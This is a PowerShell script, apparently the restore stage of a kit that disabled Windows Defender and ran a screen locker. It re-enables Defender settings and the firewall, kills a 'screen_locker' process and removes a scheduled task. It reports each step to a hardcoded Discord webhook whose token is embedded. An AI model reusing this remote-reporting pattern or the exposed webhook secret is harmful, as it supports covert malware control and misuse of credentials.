function Send-DiscordWebhook {
    param([string]$Message)
    $webhookUrl = "https://discord.com/api/webhooks/1527718727204999299/nVc21-8bK1MfgI1Ybw5hZYG3KU0xuEZZalMATPdxY-jJFizPZn_sZiObl0UEUaGRRMdA"
    $logFile = "$env:TEMP\webhook_log.txt"
    try {
        $payload = @{ content = $Message } | ConvertTo-Json -Compress
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction Stop
        Add-Content -Path $logFile -Value "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] OK: $Message"
    } catch {
        Add-Content -Path $logFile -Value "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] FAIL: $Message - $_"
    }
}

Send-DiscordWebhook "🛡️ Reativando proteção contra bloqueio à primeira vista (1/6)"
Set-MpPreference -DisableBlockAtFirstSeen $false -ErrorAction SilentlyContinue

Send-DiscordWebhook "🛡️ Reativando proteção IOAV (2/6)"
Set-MpPreference -DisableIOAVProtection $false -ErrorAction SilentlyContinue

Send-DiscordWebhook "🛡️ Reativando escaneamento de scripts (3/6)"
Set-MpPreference -DisableScriptScanning $false -ErrorAction SilentlyContinue

Send-DiscordWebhook "🛡️ Restaurando envio automático de amostras (4/6)"
Set-MpPreference -SubmitSamplesConsent 1 -ErrorAction SilentlyContinue

Send-DiscordWebhook "🛡️ Restaurando MAPS (5/6)"
Set-MpPreference -MAPSReporting 2 -ErrorAction SilentlyContinue

Send-DiscordWebhook "🔥 Reativando Firewall e finalizando limpeza (6/6)"
netsh advfirewall set allprofiles state on

$handshakeFile = "$env:TEMP\handshake_restore.txt"
if (Test-Path $handshakeFile) {
    Get-Process -Name "screen_locker" -ErrorAction SilentlyContinue | Stop-Process -Force
    Remove-Item -Path $handshakeFile -Force
}
Unregister-ScheduledTask -TaskName "RestoreDefenses" -Confirm:$false -ErrorAction SilentlyContinue
